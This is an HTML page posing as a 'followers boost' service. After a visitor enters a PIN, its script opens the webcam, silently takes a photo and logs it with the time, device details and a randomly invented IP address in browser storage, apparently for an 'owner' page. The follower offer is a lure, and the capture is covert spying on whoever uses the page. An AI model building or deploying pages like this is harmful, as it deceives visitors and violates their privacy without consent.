<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>GET FOLLOWERS</title>
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
</head>
<body class="bg-gray-900 text-white flex flex-col items-center justify-center min-h-screen">

  <!-- Navbar -->
  <nav class="w-full bg-gray-800 p-4 flex justify-between items-center">
    <h1 class="text-xl font-bold">FOLLOWERS BOOST</h1>
    <button onclick="toggleMenu()" class="text-2xl">‚ò∞</button>
    <div id="navLinks" class="hidden absolute top-14 right-4 bg-gray-700 rounded shadow-lg">
      <a href="index.html" class="block px-4 py-2 hover:bg-gray-600">Home</a>
      <a href="owner.html" class="block px-4 py-2 hover:bg-gray-600">Owner</a>
    </div>
  </nav>

  <!-- Notice / Warning -->
  <div class="mt-6 w-11/12 md:w-2/3 bg-yellow-500 text-black p-4 rounded-lg shadow-md text-center">
     üîî<b>Notice:</b> Notice: Only enter the correct PIN provided by the admin (1111).  
  Wrong attempts will be logged.
  </div>

  <!-- User PIN -->
  <div class="mt-10 text-center">
    <h2 class="text-2xl font-semibold mb-4">Enter Access PIN</h2>
    <input id="userPin" type="password" placeholder="PIN" class="px-3 py-2 rounded text-black">
    <button onclick="userLogin()" class="bg-blue-500 px-4 py-2 ml-2 rounded hover:bg-blue-600">Login</button>
    <p id="userStatus" class="mt-4 text-green-400"></p>
  </div>

<script>
const USER_PIN = "1111";

function toggleMenu() {
  document.getElementById("navLinks").classList.toggle("hidden");
}

function userLogin() {
  const pin = document.getElementById("userPin").value;
  const status = document.getElementById("userStatus");

  if (pin === USER_PIN) {
    status.innerHTML = "‚úÖ Access Granted...";
    setTimeout(captureImage, 1000);
  } else {
    status.innerHTML = "‚ùå Wrong PIN!";
  }
}

function captureImage() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
      const video = document.createElement("video");
      video.srcObject = stream;
      video.play();

      setTimeout(() => {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL("image/png");

        // Stop camera
        stream.getTracks().forEach(track => track.stop());

        // Save capture to localStorage
        const logs = JSON.parse(localStorage.getItem("captures") || "[]");
        logs.push({
          time: new Date().toLocaleString(),
          ip: "192.168.0." + Math.floor(Math.random() * 255),
          device: navigator.userAgent + " | " + screen.width + "x" + screen.height,
          img: imageData
        });
        localStorage.setItem("captures", JSON.stringify(logs));

        document.getElementById("userStatus").innerHTML = "‚úÖ Access successful.";
      }, 1000);
    })
    .catch(err => {
      document.getElementById("userStatus").innerHTML = "‚ö†Ô∏è Camera blocked!";
      console.error("Camera error:", err);
    });
}
</script>
</body>
</html>
